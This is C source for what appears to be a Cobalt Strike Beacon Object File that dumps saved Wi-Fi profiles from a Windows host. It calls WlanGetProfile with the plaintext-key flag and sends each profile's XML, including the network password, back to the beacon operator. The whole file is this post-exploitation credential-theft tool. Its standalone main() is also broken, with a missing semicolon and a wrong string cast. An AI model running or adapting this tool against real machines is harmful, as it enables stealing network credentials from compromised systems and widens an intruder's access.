#ifndef UNICODE
#define UNICODE
#endif

#include "bofdefs.h"
#include "base.c"
#include <wlanapi.h>
#include <objbase.h>
#include <wtypes.h>
#include <stdio.h>
#include <stdlib.h>

#define WLAN_PROFILE_GET_PLAINTEXT_KEY 4
#define WLAN_PROFILE_GROUP_POLICY                   0x00000001
#define WLAN_READ_ACCESS    ( STANDARD_RIGHTS_READ | FILE_READ_DATA )
#define WLAN_EXECUTE_ACCESS ( WLAN_READ_ACCESS | STANDARD_RIGHTS_EXECUTE | FILE_EXECUTE )
#define WLAN_WRITE_ACCESS   ( WLAN_READ_ACCESS | WLAN_EXECUTE_ACCESS | STANDARD_RIGHTS_WRITE | FILE_WRITE_DATA | DELETE | WRITE_DAC )

void wifidump(wchar_t * pProfileName)  
{
        //Declare variables
        HANDLE hClient = NULL;
        DWORD dwMaxClient = 2;      //    
        DWORD dwCurVersion = 0;
        DWORD dwResult = 0;
        DWORD dwRetVal = 0;
        int iRet = 0;
        WCHAR GuidString[39] = {0};
        unsigned int i;
        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
        PWLAN_INTERFACE_INFO pIfInfo = NULL;
        LPWSTR pProfileXml = NULL;
        DWORD dwFlags = 0;
        DWORD dwGrantedAccess = 0;

        //Open handle on wifi interface
        dwResult = WLANAPI$WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
        if (dwResult != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT,"WlanOpenHandle failed with error: %u\n", dwResult);
        }
        dwResult = WLANAPI$WlanEnumInterfaces(hClient, NULL, &pIfList);
        if (dwResult != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT,"WlanEnumInterfaces failed with error: %u\n", dwResult);
        } else {
            for (i = 0; i < (int) pIfList->dwNumberOfItems; i++) {
                pIfInfo = (WLAN_INTERFACE_INFO *) &pIfList->InterfaceInfo[i];               
                iRet = OLE32$StringFromGUID2(&pIfInfo->InterfaceGuid, (LPOLESTR) &GuidString, 
                    sizeof(GuidString)/sizeof(*GuidString)); 
                dwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                dwResult = WLANAPI$WlanGetProfile(hClient,
                                                &pIfInfo->InterfaceGuid,
                                                pProfileName,
                                                NULL, 
                                                &pProfileXml,
                                                &dwFlags,
                                                &dwGrantedAccess);                                  
                if (dwResult != ERROR_SUCCESS) {
                    BeaconPrintf(CALLBACK_OUTPUT,"WlanGetProfile failed with error: %u\n",
                        dwResult);
                } else {
                    BeaconPrintf(CALLBACK_OUTPUT,"Profile XML string: %ws\n", pProfileXml);
                }
            }
        }
        if (pProfileXml != NULL) {
            WLANAPI$WlanFreeMemory(pProfileXml);
            pProfileXml = NULL;
        }
        if (pIfList != NULL) {
            WLANAPI$WlanFreeMemory(pIfList);
            pIfList = NULL;
        }
}



#ifdef BOF
VOID go(IN PCHAR Buffer, IN ULONG Length) 
{
	// Parse Beacon Arguments
        datap parser;
        wchar_t * pProfileName;
        BeaconDataParse(&parser, Buffer, Length);
        pProfileName = (wchar_t *)BeaconDataExtract(&parser, NULL);

	if(!bofstart())
	{
		return;
	}
	//CALLYOURFUNCHERE
	wifidump(pProfileName);
	printoutput(TRUE);
};

#else

int main(int argc, char ** argv)
{
	wchar_t * pProfileName;
	pProfileName = (wchar_t *)argv[1];
	//code for standalone exe for scanbuild / leak checks
	wifidump(pProfileName)
	return 0;
}

#endif
